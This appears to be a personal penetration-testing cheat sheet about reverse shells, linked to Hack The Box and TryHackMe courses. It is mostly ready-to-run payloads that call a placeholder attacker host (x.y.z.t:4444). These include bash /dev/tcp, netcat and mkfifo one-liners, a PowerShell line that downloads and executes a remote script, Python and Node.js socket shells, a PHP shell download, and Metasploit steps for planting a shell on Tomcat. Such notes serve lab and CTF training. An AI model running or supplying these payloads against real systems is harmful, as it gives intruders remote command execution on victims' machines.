# Reverse shell

[![shells_and_payloads](../../../_badges/htb/shells_and_payloads.svg)](https://academy.hackthebox.com/course/preview/shells--payloads)
[![fileuploadattacks](../../../_badges/htb/fileuploadattacks.svg)](https://academy.hackthebox.com/course/preview/file-upload-attacks)
[![introtoshells](../../../_badges/thmp/introtoshells.svg)](https://tryhackme.com/room/introtoshells)

<div class="row row-cols-lg-2"><div>

When a victim <small>(client)</small> connects to a server <small>(hacker)</small>, we gain access to what we call a 'reverse shell,' allowing us to run commands on the victim and maybe compromise it.

The 'reverse' comes from the fact that the target is the one connecting to use, while with ssh or other remote tools, the client is 'normally' the one initiating the connection. üí•

The hacker will run a listener on their machine and wait for the compromised target to connect back to it, e.g. wait for the target to execute the reverse shell payload ü™≤.
</div><div>

You will have to configure the selected reverse shell that you will use to connect back to the listener. For the commands below, we consider the host with the listener IP to be `x.y.z.t`; port `4444` .

If your target is missing a binary, you may be able to download a precompiled version on [andrew-d GitHub](https://github.com/andrew-d/static-binaries/tree/master/binaries) <small>(3.3k ‚≠ê, 2020 ü™¶)</small>.

**For the listener**, you can use tools listed in [Remote Shell](../index.md#remote-shell-) or a simple instable netcat listener listening on the selected port:

```shell!
$ nc -lvnp 4444 # await the reverse shell payload execution
```
</div></div>

<hr class="sep-both">

## Revshells website

<div class="row row-cols-lg-2"><div>

[revshells](https://www.revshells.com/) is a popular website to create reverse shell payloads, along with generating listener commands.

* Example: "Bash" client

```shell!
$ sh -i >& /dev/tcp/x.y.z.t/4444 0>&1
```

* Example: "nc.exe -e" client

```shell!
PS> nc.exe x.y.z.t 4444 -e sh
```

‚û°Ô∏è Select one based on what command you can run on the target.
</div><div>

Other alternatives are:

* [revshellgen](https://github.com/t0thkr1s/revshellgen) (0.4k ‚≠ê, script)
* [ShellPop](https://github.com/0x00-0x00/ShellPop) (1.4k ‚≠ê, script, 2018/2019)
</div></div>

<hr class="sep-both">

## PHP reverse shell

<div class="row row-cols-lg-2"><div>

You could check out [this script by pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) (1.4k ‚≠ê, 2015). This is a well-known reference.

On Kali Linux, there is local copy in `/usr/share/webshells/php/`.

```bash!
$ cp /usr/share/webshells/php/php-reverse-shell.php /tmp/revshell.php
$ sed -i 's/127.0.0.1/x.y.z.t/' /tmp/revshell.php
$ sed -i 's/1234/4444/' /tmp/revshell.php
```
</div><div>
</div></div>

<hr class="sep-both">

## netcat client

[![introtoshells](../../../_badges/thmp/introtoshells.svg)](https://tryhackme.com/room/introtoshells)

<div class="row row-cols-lg-2"><div>

The most common usage is:

```ps
$ nc -c /bin/bash x.y.z.t 4444
```
</div><div>

Netcat option `-e` is often not available due to security measures.

```ps
$ nc x.y.z.t 4444 -e /bin/bash
```
</div></div>

<hr class="sep-both">

## Linux targets

<div class="row row-cols-lg-2"><div>

#### TCP socket

```shell!
$ /bin/bash -i >& /dev/tcp/x.y.z.t/4444 0>&1
```
</div><div>

#### Named pipe

[![shells_and_payloads](../../../_badges/htb/shells_and_payloads.svg)](https://academy.hackthebox.com/course/preview/shells--payloads)

```shell!
$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc x.y.z.t 4444 >/tmp/f
```
</div></div>

<hr class="sep-both">

## Windows targets

<div class="row row-cols-lg-2"><div>

You can try [ConPtyShell](https://github.com/antonioCoco/ConPtyShell) <small>(1.1k ‚≠ê)</small>.

```ps
PS> IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing)
PS> Invoke-ConPtyShell x.y.z.t 4444
```

```ps
$ curl http://$IP:$PORT/revshell.php -o /dev/shm/revshell.php
$ php /dev/shm/revshell.php
$ export RHOST="x.y.z.t";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```
</div><div>

You can try [powercat](https://github.com/besimorhino/powercat) <small>(2.2k ‚≠ê, powershell netcat client/server)</small>
</div></div>

<hr class="sep-both">

## Tomcat Reverse Shell

<div class="row row-cols-lg-2"><div>

You can use [metasploit](/cybersecurity/red-team/tools/frameworks/metasploit/index.md) to both generate a shell and upload it. It doesn't work with at least tomcat 7.8.

```shell!
$ msfconsole -q
msf6> use exploit/multi/http/tomcat_mgr_upload
msf6> set RHOSTS <target>
msf6> set RPORT 8080
msf6> set HttpUsername username
msf6> set HttpPassword password
msf6> set LHOST tun0
msf6> set VERBOSE true # error 500 == it won't work
msf6> run
```
</div><div>

You can use [msfvenom](/cybersecurity/red-team/tools/frameworks/metasploit/msfvenom.md#-some-payloads-) to generate a reverse shell.

You can also create one manually. For the contents of `index.jsp`, you can use metasploit one or [this one which is similar](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/jsp/jsp-reverse.jsp).

```ps
$ nano index.jsp # fill this file
$ jar -cvf ../revshell.war index.jsp  # it works in v7
$ zip -r revshell.war index.jsp       # it works in v7
```
</div></div>

<hr class="sep-both">

## Node.js Reverse Shell

[![pythonplayground](../../../_badges/thm-p/pythonplayground.svg)](https://tryhackme.com/r/room/pythonplayground)

<div class="row row-cols-lg-2"><div>

Given the following shell from [revshells](https://www.revshells.com/):

```js!
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("sh", []);
    var client = new net.Socket();
    client.connect(4444, "x.y.z.t", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
```
</div><div>

You can execute it using `node.js reverseshell.js`.
</div></div>

<hr class="sep-both">

## üëª To-do üëª

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

* Python/Mkfifo shells are often more likely to work
* Try double reverse shell?
* [r57shell](https://r57shell.net/)
* [EzpzShell](https://github.com/H0j3n/EzpzShell)
* [hoaxshell](https://github.com/t3l3machus/hoaxshell)
</div><div>
</div></div>